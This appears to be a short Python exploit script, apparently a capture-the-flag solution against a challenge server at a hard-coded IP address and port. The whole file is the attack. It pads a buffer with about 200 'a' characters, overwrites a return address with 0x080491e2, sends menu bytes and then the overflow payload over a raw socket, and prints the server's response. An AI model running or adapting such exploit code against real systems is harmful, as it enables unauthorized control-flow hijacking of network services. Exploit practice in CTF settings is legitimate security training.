import struct
import pwn 
import socket
import time

pwn.p32(0x080491e2)
padding = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

shellcode = "\xe2\x91\x04\x08"
payload = padding + shellcode


clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 

# Connect to the server


clientSocket.connect(("178.128.164.188",30667))
clientSocket.send("\x22".encode())

time.sleep(1)


clientSocket.send("\x06".encode())

# Send data to server
time.sleep(1)

clientSocket.send(payload.encode())

 

# Receive data from server

dataFromServer = clientSocket.recv(4096)

 

# Print to the console

print(dataFromServer.decode())